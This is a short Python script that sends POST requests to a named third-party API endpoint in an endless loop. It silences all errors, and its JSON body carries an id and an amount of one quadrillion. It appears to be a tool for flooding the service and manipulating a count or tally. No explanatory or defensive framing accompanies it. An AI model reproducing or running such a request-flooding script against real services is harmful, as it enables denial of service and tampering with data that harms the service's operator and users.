import asyncio, aiohttp, time, os
URL = 'https://api-ryukogo2026.shibadogcap.com/v'
BODY = b'{"i":2974,"a":1000000000000000}'
HDR = {'Content-Type': 'application/json'}
async def main():
    async with aiohttp.ClientSession() as s:
        while True:
            try:
                async with s.post(URL, data=BODY, headers=HDR, timeout=10) as r:
                    pass
            except: pass
asyncio.run(main())